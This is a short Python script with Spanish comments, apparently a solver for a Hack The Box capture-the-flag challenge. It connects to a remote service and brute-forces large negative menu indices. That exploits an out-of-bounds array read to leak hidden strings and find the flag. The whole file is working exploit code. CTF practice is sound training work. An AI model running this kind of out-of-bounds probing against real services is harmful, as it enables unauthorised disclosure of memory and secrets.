#!/usr/bin/env python3

import socket
import time

def test_index(index):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('94.237.57.211', 45459))
        
        # Recibir menú
        data = s.recv(4096)
        
        # Enviar índice
        s.send(f"{index}\n".encode())
        
        # Recibir respuesta
        data = s.recv(4096).decode()
        
        # Enviar descripción dummy
        s.send(b"test\n")
        
        # Recibir respuesta final
        data = s.recv(4096).decode()
        
        if "You've chosen:" in data:
            lines = data.split('\n')
            for line in lines:
                if "You've chosen:" in line:
                    chosen = line.split("You've chosen:")[1].strip()
                    return chosen
        
        s.close()
        return None
        
    except Exception as e:
        return None

def main():
    print("Buscando strings ocultas...")
    
    # Probar índices negativos grandes que podrían apuntar a strings ocultas
    base_index = -262759  # Índice que funcionó para Anti DoS
    
    interesting_strings = []
    
    # Probar un rango alrededor del índice base
    for offset in range(-100, 100):
        index = base_index + offset
        result = test_index(index)
        
        if result:
            print(f"Índice {index}: '{result}'")
            
            # Buscar patrones de flag
            if any(pattern in result.lower() for pattern in ['htb', 'flag', '{', '}', 'ctf']):
                print(f"*** POSIBLE FLAG ENCONTRADA: {result} ***")
                interesting_strings.append((index, result))
            elif len(result) > 10 and result not in ['MechWings', 'TechFeathers', 'CircuitBirds', 'SteelAvians', 'NanoNestlings', 'ByteBeaks', 'ElectricEaglets', 'GearRavens', 'SiliconSparrows', 'AutomataFowl']:
                interesting_strings.append((index, result))
        
        time.sleep(0.1)
    
    if interesting_strings:
        print("\n=== STRINGS INTERESANTES ENCONTRADOS ===")
        for index, string in interesting_strings:
            print(f"Índice {index}: {string}")

if __name__ == "__main__":
    main()